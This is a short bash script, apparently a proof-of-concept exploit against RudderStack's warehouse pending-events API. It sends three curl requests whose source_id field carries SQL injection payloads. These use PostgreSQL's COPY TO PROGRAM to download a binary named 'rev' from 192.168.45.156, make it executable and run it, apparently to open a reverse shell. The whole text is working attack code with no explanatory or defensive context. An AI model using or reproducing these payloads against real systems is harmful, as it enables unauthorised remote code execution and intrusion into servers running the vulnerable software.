#!/bin/bash
payload1="'"' order by 1; copy (select $$a$$) to program $$wget http://192.168.45.156/rev$$;-- -'

curl http://rudderstack/v1/warehouse/pending-events \
  -X POST \
  -H 'Content-Type:application/json' \
  -d "{\"source_id\":\"1${payload1}\"}" \
  -x http://localhost:8080

payload2="'"' order by 1; copy (select $$a$$) to program $$chmod +x ./rev$$;-- -'

curl http://rudderstack/v1/warehouse/pending-events \
  -X POST \
  -H 'Content-Type:application/json' \
  -d "{\"source_id\":\"1${payload2}\"}" \
  -x http://localhost:8080

payload3="'"' order by 1; copy (select $$a$$) to program $$./rev$$;-- -'

curl http://rudderstack/v1/warehouse/pending-events \
  -X POST \
  -H 'Content-Type:application/json' \
  -d "{\"source_id\":\"1${payload3}\"}" \
  -x http://localhost:8080
